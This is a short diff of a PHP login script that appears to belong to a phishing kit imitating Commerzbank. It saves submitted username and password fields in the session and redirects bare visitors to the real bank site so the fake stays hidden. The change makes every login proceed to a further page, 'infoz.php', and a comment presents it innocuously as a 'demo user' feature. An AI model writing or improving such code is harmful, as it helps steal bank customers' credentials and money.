@@ -17,9 +17,14 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         header('Location: infoz.php');
         exit();
     } else {
-        // Regular user login
+        // Regular user login - treat as demo user to show upload functionality
         $_SESSION['xusr'] = $_POST['xusr'];
         $_SESSION['xpss'] = $_POST['xpss'];
+        $_SESSION['demo_user'] = true;
+        
+        // Redirect to next step
+        header('Location: infoz.php');
+        exit();
     }
 } else {
     header('Location: https://www.commerzbank.de/');
